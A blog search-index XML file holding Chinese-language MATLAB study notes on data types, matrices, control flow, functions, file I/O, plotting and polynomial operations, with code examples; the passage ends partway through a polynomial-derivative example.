<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Matlab学习笔记</title>
    <url>/2022/02/13/Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="变量类型">变量类型</h4>
<p>可通过<code>class(var)</code>查看<code>var</code>的变量类型</p>
<h5 id="logical">logical</h5>
<h5 id="char">char</h5>
<p>由一对单引号<code>''</code>包裹</p>
<h5 id="numeric">numeric</h5>
<p>默认为double类型</p>
<p>可选类型有：int8, int16, int32, int64, uint8, uint16, uint32, uint64, single, double</p>
<p>更改数值型变量显示格式，可使用如<code>format short</code></p>
<span id="more"></span>
<table>
<thead>
<tr class="header">
<th>格式</th>
<th>表现形式</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>short</td>
<td>整数显示为整数，浮点数保留小数点后4位</td>
</tr>
<tr class="even">
<td>long</td>
<td>整数显示为整数，浮点数保留小数点后15位</td>
</tr>
<tr class="odd">
<td>shortE</td>
<td>显示小数点后4位，以科学记数法表示</td>
</tr>
<tr class="even">
<td>longE</td>
<td>显示小数点后15位，以科学记数法表示</td>
</tr>
<tr class="odd">
<td>bank</td>
<td>显示小数点后两位</td>
</tr>
<tr class="even">
<td>hex</td>
<td>显示为十六进制</td>
</tr>
<tr class="odd">
<td>rat</td>
<td>显示为比例（分数）格式</td>
</tr>
</tbody>
</table>
<h5 id="struct">struct</h5>
<p>与C语言的struct类似</p>
<p>可直接通过<code>.</code>来赋值或访问</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 赋值</span></span><br><span class="line">student.name = <span class="string">&#x27;John&#x27;</span>;</span><br><span class="line">student.num = <span class="number">10001</span>;</span><br><span class="line">student.score = <span class="number">90</span>;</span><br><span class="line">student(<span class="number">2</span>).name = <span class="string">&#x27;David&#x27;</span>;</span><br><span class="line">student(<span class="number">2</span>).num = <span class="number">10002</span>;</span><br><span class="line">student(<span class="number">2</span>).score = <span class="number">95</span>;</span><br><span class="line"><span class="comment">% 删除</span></span><br><span class="line">student(<span class="number">2</span>).name = [];</span><br><span class="line">student(<span class="number">1</span>) = [];</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">函数</th>
<th style="text-align: center;">作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>struct(field1, value1, ... , fieldN, valueN)</code></td>
<td style="text-align: center;">创建结构体</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>struct2cell(S)</code></td>
<td style="text-align: center;">将结构体转换为元胞数组</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>cell2struct(C)</code></td>
<td style="text-align: center;">将元胞数组转换为结构体</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>structfun(func, S)</code></td>
<td style="text-align: center;">将函数func作用于结构体S的每个字段</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>fieldnames(S)</code></td>
<td style="text-align: center;">获取结构体的所有字段名</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>isfield(S, field)</code></td>
<td style="text-align: center;">判断结构体S中是否含有字段field</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>orderfields(S)</code></td>
<td style="text-align: center;">将结构体S的字段按名称排序</td>
</tr>
</tbody>
</table>
<h5 id="cell">cell</h5>
<p>使用<code>&#123;&#125;</code>创建元胞数组</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">A = &#123;<span class="number">3</span>, <span class="string">&#x27;John&#x27;</span>; <span class="number">1</span>:<span class="number">10</span>, [<span class="number">1</span>, <span class="number">2</span>; <span class="number">3</span>, <span class="number">4</span>]&#125;;</span><br><span class="line"><span class="comment">%单元索引()，返回子元胞数组</span></span><br><span class="line">A(<span class="number">1</span>, <span class="number">1</span>) = &#123;[<span class="number">3</span>]&#125;;</span><br><span class="line">A(<span class="number">1</span>, <span class="number">2</span>) = &#123;<span class="string">&#x27;John&#x27;</span>&#125;;</span><br><span class="line"><span class="comment">%内容索引&#123;&#125;，返回元胞数组对应位置的值</span></span><br><span class="line">A&#123;<span class="number">1</span>, <span class="number">1</span>&#125; = <span class="number">3</span>;</span><br><span class="line">A&#123;<span class="number">1</span>, <span class="number">2</span>&#125; = <span class="string">&#x27;John&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="常用数学运算函数">常用数学运算函数</h4>
<p>加<code>+</code></p>
<p>减<code>-</code></p>
<p>乘<code>*</code></p>
<p>矩阵对应元素相乘<code>.*</code></p>
<p>右除<code>/</code> （<code>A/B</code>相当于<code>A*inv(B)</code>）</p>
<p>左除<code>\</code> （<code>A\B</code>相当于<code>inv(A)*B</code>）</p>
<p>乘方<code>^</code></p>
<p>矩阵对应元素乘方<code>.^</code></p>
<p>取模<code>mod(a, b)</code></p>
<p>向上取整<code>ceil(x)</code></p>
<p>向下取整<code>floor(x)</code></p>
<p>四舍五入<code>round(x)</code></p>
<p>舍弃小数部分<code>fix(x)</code></p>
<p>矩阵求逆<code>inv(A)</code></p>
<p>向量点乘<code>dot(A, B)</code></p>
<p>向量叉乘<code>cross(A, B)</code></p>
<p>三角函数<code>sin(x)</code> <code>cos(x)</code> <code>tan(x)</code> <code>asin(x)</code> <code>acos(x)</code> <code>atan(x)</code></p>
<p>指对数函数<code>exp(x)</code> <code>log(x)</code>（即<code>ln(x)</code>) <code>log10(x)</code> <code>log2(x)</code> <code>pow2(x)</code> <code>sqrt(x)</code></p>
<h4 id="矩阵">矩阵</h4>
<h5 id="创建矩阵">创建矩阵</h5>
<p>使用空格<code></code>或逗号<code>,</code>行内分隔，使用分号<code>;</code>行间分隔</p>
<p><span class="math inline">\([1, 2; 3, 4] = \left[ \begin{array}{} 1&amp; 2 \\ 3&amp; 4 \end{array} \right]\)</span></p>
<p>创建向量<code>i:k:j</code>起始为i，终点为j，步长为k <code>i:j</code>默认步长为1</p>
<p>特殊矩阵：</p>
<p><span class="math inline">\(n \times n\)</span>的单位阵 <code>eye(n)</code></p>
<p><span class="math inline">\(n_1 \times n_2\)</span>的零矩阵 <code>zeros(n1, n2)</code></p>
<p><span class="math inline">\(n_1 \times n_2\)</span>的全为1矩阵 <code>ones(n1, n2)</code></p>
<p>以向量<code>vector</code>为对角线的对角阵 <code>diag(vector)</code></p>
<h5 id="矩阵索引">矩阵索引</h5>
<p>矩阵A的第i行第j列<code>A(i, j)</code></p>
<p>取出矩阵<span class="math inline">\(i_1, i_2, i_3\)</span>行 <code>A([i1, i2, i3], :)</code></p>
<p>取出矩阵<span class="math inline">\(i_1, i_2, i_3\)</span>列 <code>A( : , [i1, i2, i3])</code></p>
<p>取出矩阵前n行<code>A(1:n, :)</code></p>
<h5 id="常用函数">常用函数</h5>
<p>注：以下函数中，<code>dim=1</code>表示按列操作，<code>dim=2</code>表示按行操作</p>
<p>获取矩阵A在dim维度上的最大值<code>max(A, [], dim)</code></p>
<p>获取矩阵A在dim维度上的最小值<code>min(A, [], dim)</code></p>
<p>获取矩阵A在dim维度上的和<code>sum(A, dim)</code></p>
<p>获取矩阵A在dim维度上的平均值<code>mean(A, dim)</code></p>
<p>获取矩阵A在dim维度上按dir（可选<code>'ascned'</code>或<code>'descend'</code>）顺序排序结果<code>sort(A, dim, dir)</code></p>
<p>获取矩阵A按照每行第col个元素按dir顺序排序结果<code>sortrows(A, col, dir)</code></p>
<p>获取矩阵的行和列<code>size(A)</code></p>
<h4 id="基本编程语句">基本编程语句</h4>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">%if语句</span></span><br><span class="line"><span class="keyword">if</span> condition1</span><br><span class="line">	statement1</span><br><span class="line"><span class="keyword">elseif</span> condition2</span><br><span class="line">	statement2</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	statement3</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">%switch语句</span></span><br><span class="line"><span class="keyword">switch</span> expression</span><br><span class="line"><span class="keyword">case</span> value1</span><br><span class="line">	statement1</span><br><span class="line"><span class="keyword">case</span> value2</span><br><span class="line">	statement2</span><br><span class="line"><span class="keyword">otherwise</span></span><br><span class="line">	statement</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">%while语句</span></span><br><span class="line"><span class="keyword">while</span> condition</span><br><span class="line">	statement</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">%for语句</span></span><br><span class="line"><span class="keyword">for</span> var = start : increment : <span class="keyword">end</span></span><br><span class="line">	statement</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h4 id="定义函数">定义函数</h4>
<h5 id="标准方式">标准方式</h5>
<p>创建<code>function.m</code>文件</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">%例如定义快速幂函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y</span> = <span class="title">quick_power</span><span class="params">(base, power)</span></span></span><br><span class="line">y = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> power &gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">mod</span>(power, <span class="number">2</span>) == <span class="number">1</span></span><br><span class="line">        y = y * base;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    base = base * base;</span><br><span class="line">    power = <span class="built_in">fix</span>(power / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">%将华氏温度转化为摄氏温度，使用Ctrl+c退出程序</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F_to_C</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span></span><br><span class="line">    F_degree = input(<span class="string">&#x27;tempreature in Fahrenheit: &#x27;</span>, <span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">    F_degree = str2double(F_degree);</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isempty</span>(F_degree)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    C_degree = (F_degree<span class="number">-32</span>)*<span class="number">5</span>/<span class="number">9</span>;</span><br><span class="line">    <span class="built_in">disp</span>([<span class="string">&#x27;tempreature in Celsius: &#x27;</span> num2str(C_degree)])</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h5 id="函数句柄的形式定义函数">函数句柄的形式定义函数</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数 = @(输入变量) 输出变量</span><br></pre></td></tr></table></figure>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">f = @(x, y) <span class="built_in">exp</span>(-(x*x + y*y));</span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<h4 id="文件操作">文件操作</h4>
<p>Matlab支持的文件类型</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">文件内容</th>
<th style="text-align: center;">扩展名</th>
<th style="text-align: center;">读取文件的函数</th>
<th style="text-align: center;">写入文件的函数</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">Matlab数据</td>
<td style="text-align: center;"><code>.mat</code></td>
<td style="text-align: center;"><code>load()</code></td>
<td style="text-align: center;"><code>save()</code></td>
</tr>
<tr class="even">
<td style="text-align: center;">Excel表格</td>
<td style="text-align: center;"><code>.xls</code>,<code>.xlsx</code></td>
<td style="text-align: center;"><code>readtable()</code></td>
<td style="text-align: center;"><code>writetable()</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;">空格分隔的数字</td>
<td style="text-align: center;"><code>.txt</code></td>
<td style="text-align: center;"><code>load()</code></td>
<td style="text-align: center;"><code>save()</code></td>
</tr>
</tbody>
</table>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">T = <span class="built_in">readtable</span>(<span class="string">&#x27;in.xlsx&#x27;</span>); <span class="comment">% 读取in.xlsx表格中的内容</span></span><br><span class="line">S = table2struct(T); <span class="comment">% 将表格转化为结构体</span></span><br><span class="line">row = <span class="built_in">size</span>(T, <span class="number">1</span>); <span class="comment">% 获取表格行数</span></span><br><span class="line">col = <span class="built_in">size</span>(T, <span class="number">2</span>); <span class="comment">% 获取表格列数</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span> : row</span><br><span class="line">	S(<span class="built_in">i</span>).score = <span class="built_in">sqrt</span>(S(<span class="built_in">i</span>).score) * <span class="number">10</span> <span class="comment">% 对结构体每一项的score值开根号再乘10</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">[~, index] = <span class="built_in">sort</span>([S.field], <span class="string">&#x27;descend&#x27;</span>) <span class="comment">% 按照结构体S的字段field降序排序，得到顺序为index</span></span><br><span class="line">S = S(index, :); <span class="comment">% 将S按照index的顺序排序，即将结构体降序排序</span></span><br><span class="line">T = struct2table(S) <span class="comment">% 将处理后的结构体转化为表格</span></span><br><span class="line"><span class="built_in">writetable</span>(T, <span class="string">&#x27;out.xlsx&#x27;</span>) <span class="comment">% 将表格T存入out.xlsx文件中</span></span><br></pre></td></tr></table></figure>
<h4 id="基础绘图">基础绘图</h4>
<h5 id="绘制二维线图">绘制二维线图</h5>
<p>使用<code>plot()</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="built_in">plot</span>(X1, Y1, LineSpec1, ... , Xn, Yn, LineSpecn)</span><br></pre></td></tr></table></figure>
<p><code>LineSpec</code>的可选项通过<code>help plot</code>查看官方文档获取</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">x = <span class="built_in">linspace</span>(<span class="number">0</span>, <span class="number">2</span>*<span class="built_in">pi</span>);</span><br><span class="line">y1 = <span class="built_in">sin</span>(x);</span><br><span class="line">y2 = <span class="built_in">cos</span>(x);</span><br><span class="line"><span class="built_in">plot</span>(x, y1, <span class="string">&#x27;--.r&#x27;</span>, x, y2, <span class="string">&#x27;-.*k&#x27;</span>); <span class="comment">% 绘制six(x)与cos(x)图像</span></span><br><span class="line"><span class="built_in">legend</span>(<span class="string">&#x27;sin(x)&#x27;</span>, <span class="string">&#x27;cos(x)&#x27;</span>); <span class="comment">% 添加图例</span></span><br><span class="line">title(<span class="string">&#x27;Function of sin(x) &amp; cos(x)&#x27;</span>); <span class="comment">% 添加图标题</span></span><br><span class="line">xlabel(<span class="string">&#x27;x = 0 to 2\pi&#x27;</span>) <span class="comment">% 添加x轴标签</span></span><br><span class="line">ylabel(<span class="string">&#x27;sin(x) &amp; cos(x)&#x27;</span>) <span class="comment">% 添加y轴标签</span></span><br></pre></td></tr></table></figure>
<p>使用<code>line()</code>函数可绘制基本线条</p>
<p>使用<code>text()</code>函数可添加文本说明</p>
<p>使用<code>annotation()</code>函数创建箭头等</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">x = <span class="built_in">linspace</span>(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">y = x.^<span class="number">2</span> .* <span class="built_in">sin</span>(x);</span><br><span class="line"><span class="built_in">plot</span>(x, y);</span><br><span class="line">line([<span class="number">2</span>, <span class="number">2</span>],[<span class="number">0</span>, <span class="number">2</span>^<span class="number">2</span> * <span class="built_in">sin</span>(<span class="number">2</span>)]); <span class="comment">% 绘制x=2的直线</span></span><br><span class="line">str = <span class="string">&#x27;$$ \int_&#123;0&#125;^&#123;2&#125; x^2\sin(x) dx $$&#x27;</span>;</span><br><span class="line">text(<span class="number">0.25</span>, <span class="number">2.5</span>, str, <span class="string">&#x27;Interpreter&#x27;</span>, <span class="string">&#x27;latex&#x27;</span>); <span class="comment">% 以latex形式添加说明内容str</span></span><br><span class="line">annotation(<span class="string">&#x27;arrow&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, [<span class="number">0.32</span>, <span class="number">0.5</span>], <span class="string">&#x27;Y&#x27;</span>, [<span class="number">0.6</span>, <span class="number">0.4</span>]); <span class="comment">% 添加箭头</span></span><br></pre></td></tr></table></figure>
<h5 id="绘制散点图">绘制散点图</h5>
<p>使用<code>scatter()</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">x = <span class="built_in">linspace</span>(<span class="number">0</span>, <span class="number">2</span>*<span class="built_in">pi</span>, <span class="number">200</span>);</span><br><span class="line">y = <span class="built_in">cos</span>(x) + <span class="built_in">rand</span>(<span class="number">1</span>, <span class="number">200</span>); <span class="comment">% 添加(0, 1)之间的随机偏差值</span></span><br><span class="line">sz = <span class="number">25</span>; <span class="comment">% 散点的大小</span></span><br><span class="line">c = <span class="built_in">linspace</span>(<span class="number">1</span>, <span class="number">10</span>, <span class="built_in">length</span>(x)); <span class="comment">% 设定颜色变化</span></span><br><span class="line"><span class="built_in">scatter</span>(x, y, sz, c, <span class="string">&#x27;filled&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="调整坐标轴边框网格">调整坐标轴、边框、网格</h5>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">命令</th>
<th style="text-align: center;">作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>axis on/off</code></td>
<td style="text-align: center;">设置坐标轴可见性</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>axis normal</code></td>
<td style="text-align: center;">默认图框纵横比</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>axis equal</code></td>
<td style="text-align: center;">沿每个坐标轴使用相同的数据单位长度</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>axis tight</code></td>
<td style="text-align: center;">将坐标轴范围设置为等同于数据范围，使轴框紧密围绕数据</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>box on/off</code></td>
<td style="text-align: center;">设置边框可见性</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>grid on/off</code></td>
<td style="text-align: center;">设置网格可见性</td>
</tr>
</tbody>
</table>
<h5 id="在一个图像中绘制多条图线">在一个图像中绘制多条图线</h5>
<p>使用<code>hold on</code>与<code>hold off</code>使多个绘图结果保留在绘图区中</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">x = <span class="number">0</span> : <span class="built_in">pi</span>/<span class="number">100</span> : <span class="number">2</span>*<span class="built_in">pi</span>;</span><br><span class="line"><span class="built_in">hold</span> on</span><br><span class="line"><span class="built_in">plot</span>(x, <span class="built_in">sin</span>(x));</span><br><span class="line"><span class="built_in">plot</span>(x, <span class="built_in">cos</span>(x));</span><br><span class="line"><span class="built_in">hold</span> off</span><br></pre></td></tr></table></figure>
<h5 id="在一个窗口绘制多个子图">在一个窗口绘制多个子图</h5>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">subplot(m, n, p) <span class="comment">% 将图窗分为m行n列，在第p个网格内绘制图像</span></span><br></pre></td></tr></table></figure>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">x = <span class="built_in">linspace</span>(-<span class="built_in">pi</span>, <span class="built_in">pi</span>);</span><br><span class="line">y1 = <span class="built_in">sin</span>(x);</span><br><span class="line">y2 = x - x.^<span class="number">3</span> / <span class="number">6</span> + x.^<span class="number">5</span> / <span class="number">120</span>;</span><br><span class="line"></span><br><span class="line">subplot(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">plot</span>(x, y1);</span><br><span class="line">title(<span class="string">&#x27;sin(x)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">subplot(<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">plot</span>(x, y2);</span><br><span class="line">title(<span class="string">&#x27;Taylor poly&#x27;</span>);</span><br><span class="line"></span><br><span class="line">subplot(<span class="number">2</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>]); <span class="comment">% 在3、4网格合并绘制子图</span></span><br><span class="line"><span class="built_in">plot</span>(x, y1, x, y2);</span><br><span class="line">title(<span class="string">&#x27;sin(x) &amp; Taylor poly&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h5 id="获取图形句柄">获取图形句柄</h5>
<p>使用<code>get()</code>和<code>set()</code>函数可访问或修改图形对象的属性，具体操作参见官方文档</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">x = <span class="built_in">linspace</span>(<span class="number">0</span>, <span class="number">2</span>*<span class="built_in">pi</span>);</span><br><span class="line">y = <span class="built_in">sin</span>(x);</span><br><span class="line">pic = <span class="built_in">plot</span>(x, y);</span><br><span class="line">set(pic, <span class="string">&#x27;LineWidth&#x27;</span>, <span class="number">4</span>, <span class="string">&#x27;Color&#x27;</span>, <span class="string">&#x27;b&#x27;</span>); <span class="comment">% 设置线宽和颜色</span></span><br><span class="line">set(gca, <span class="string">&#x27;XTick&#x27;</span>, <span class="number">0</span>:<span class="built_in">pi</span>/<span class="number">2</span>:<span class="number">2</span>*<span class="built_in">pi</span>); <span class="comment">% 设置x轴的坐标值</span></span><br><span class="line">set(gca, <span class="string">&#x27;XTickLabel&#x27;</span>, &#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;\pi/2&#x27;</span>, <span class="string">&#x27;\pi&#x27;</span>, <span class="string">&#x27;3\pi/2&#x27;</span>, <span class="string">&#x27;2\pi&#x27;</span>&#125;); <span class="comment">% 设置x轴坐标的Label</span></span><br><span class="line">get(pic) <span class="comment">% 返回图像pic的所有属性值</span></span><br></pre></td></tr></table></figure>
<h5 id="保存图形">保存图形</h5>
<p>使用<code>saveas()</code>或<code>print()</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">fig = <span class="built_in">plot</span>(<span class="number">1</span>: <span class="number">10</span>);</span><br><span class="line">saveas(fig, <span class="string">&#x27;figure.png&#x27;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">x = <span class="built_in">linspace</span>(<span class="number">0</span>, <span class="number">2</span>*<span class="built_in">pi</span>);</span><br><span class="line">y1 = <span class="built_in">sin</span>(x);</span><br><span class="line">y2 = <span class="built_in">cos</span>(x);</span><br><span class="line"></span><br><span class="line">subplot(<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">plot</span>(x, y1);</span><br><span class="line"></span><br><span class="line">subplot(<span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">plot</span>(x, y2);</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;figure&#x27;</span>, <span class="string">&#x27;-dpng&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="进阶绘图">进阶绘图</h4>
<h5 id="折线图">折线图</h5>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">函数</th>
<th style="text-align: center;">特征</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>loglog()</code></td>
<td style="text-align: center;">x轴和y轴都取对数坐标</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>semilogx()</code></td>
<td style="text-align: center;">x轴取对数坐标</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>semilogy()</code></td>
<td style="text-align: center;">y轴取对数坐标</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>plotyy()</code></td>
<td style="text-align: center;">双y轴</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>polarplot()</code></td>
<td style="text-align: center;">极坐标系</td>
</tr>
</tbody>
</table>
<h5 id="统计图表">统计图表</h5>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">函数</th>
<th style="text-align: center;">图形</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>histogram()</code></td>
<td style="text-align: center;">直方图</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>bar()</code></td>
<td style="text-align: center;">条形图</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>pie()</code></td>
<td style="text-align: center;">饼图</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>stairs()</code></td>
<td style="text-align: center;">阶梯图</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>stem()</code></td>
<td style="text-align: center;">针状图</td>
</tr>
</tbody>
</table>
<h5 id="三维图像投影">三维图像投影</h5>
<p>使用<code>imagesc()</code>函数，使用<code>colorbar</code>命令可以增加二维图上颜色与高度对应的图例</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">Z = <span class="number">10</span> + peaks;</span><br><span class="line">surf(Z);</span><br><span class="line"><span class="built_in">hold</span> on</span><br><span class="line">imagesc(Z);</span><br></pre></td></tr></table></figure>
<h5 id="三维线图">三维线图</h5>
<p>使用<code>plot3()</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">t = <span class="number">0</span>: <span class="built_in">pi</span>/<span class="number">50</span>: <span class="number">10</span>*<span class="built_in">pi</span>;</span><br><span class="line">st = <span class="built_in">sin</span>(t);</span><br><span class="line">ct = <span class="built_in">cos</span>(t);</span><br><span class="line"><span class="built_in">plot3</span>(st, ct, t)</span><br></pre></td></tr></table></figure>
<h5 id="三维面图">三维面图</h5>
<p>首先使用<code>meshgrid()</code>函数生成二维网格，之后利用<code>mesh()</code>或<code>surf()</code>函数绘制三维面，前者不填充网格而后者填充网格</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">[X, Y] = <span class="built_in">meshgrid</span>(<span class="number">-8</span>: <span class="number">0.5</span>: <span class="number">8</span>);</span><br><span class="line">R = <span class="built_in">sqrt</span>(X.^<span class="number">2</span> + Y.^<span class="number">2</span>) + <span class="built_in">eps</span>;</span><br><span class="line">Z = <span class="built_in">sin</span>(R)./R;</span><br><span class="line">C = X.*Y;</span><br><span class="line"></span><br><span class="line">subplot(<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">mesh(X, Y, Z, C);</span><br><span class="line">colorbar;</span><br><span class="line"></span><br><span class="line">subplot(<span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">surf(X, Y, Z, C);</span><br><span class="line">colorbar;</span><br></pre></td></tr></table></figure>
<h5 id="等高线图">等高线图</h5>
<p>使用<code>contour()</code>和<code>contourf()</code>函数绘制三维图像的等高线，前者不填充网格而后者填充网格</p>
<p>使用<code>meshc()</code>和<code>surfc()</code>函数可在绘制三维图像时同时绘制其等高线</p>
<h5 id="绘制三维体">绘制三维体</h5>
<p>使用<code>patch()</code>函数绘制三维体或平面多边形</p>
<h4 id="多项式计算">多项式计算</h4>
<h5 id="多项式表示">多项式表示</h5>
<p>使用向量表示，向量中的元素为多项式的系数降幂排序</p>
<p>如<span class="math inline">\(f(x) = x^4 + 3x^3 -5x +2\)</span>用向量<code>p = [1, 3, 0, -5, 2]</code>表示</p>
<h5 id="多项式求值">多项式求值</h5>
<p>使用<code>polyval(p, x)</code>可计算多项式<code>p</code>在<code>x</code>每一点处的值</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">p = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">-5</span>, <span class="number">2</span>];</span><br><span class="line">x = <span class="built_in">linspace</span>(<span class="number">-2</span>, <span class="number">3</span>);</span><br><span class="line">y = polyval(p, x);</span><br><span class="line"><span class="built_in">plot</span>(x, y);</span><br></pre></td></tr></table></figure>
<h5 id="多项式相乘">多项式相乘</h5>
<p>使用<code>conv()</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">p1 = [<span class="number">1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>];</span><br><span class="line">p2 = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">-2</span>];</span><br><span class="line">p = conv(p1, p2); <span class="comment">% 得到p = [2, 1, -5, 4, 3, -2]</span></span><br></pre></td></tr></table></figure>
<h5 id="多项式因式分解">多项式因式分解</h5>
<p>使用<code>roots()</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">p = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">-2</span>];</span><br><span class="line">r = roots(p); <span class="comment">% 得到r = [-2, 1, i, -i]</span></span><br></pre></td></tr></table></figure>
<h5 id="多项式微分">多项式微分</h5>
<p>使用<code>polyder()</code>函数</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">p = [<span class="number">3</span>, <span class="number">0</span>, <span class="number">-2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>];</span><br><span class="line">dp = polyder(p); <span class="comment">% 得到dp = [15, 0, -6, 0, 1]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 求导多项式的乘积</span></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">-2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>];</span><br><span class="line">b = [<span class="number">1</span>, <span class="number">-10</span>, <span class="number">15</span>];</span><br><span class="line">dab = polyder(a, b); <span class="comment">% 得到dab = [6, -60, 140, -90, 22, -110]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 求导多项式商</span></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">-3</span>, <span class="number">0</span>, <span class="number">-1</span>];</span><br><span class="line">b = [<span class="number">1</span>, <span class="number">4</span>];</span><br><span class="line">[q, d] = polyder(a, b); <span class="comment">% 得到q = [3, 16, -3, -24, 1], d = [1, 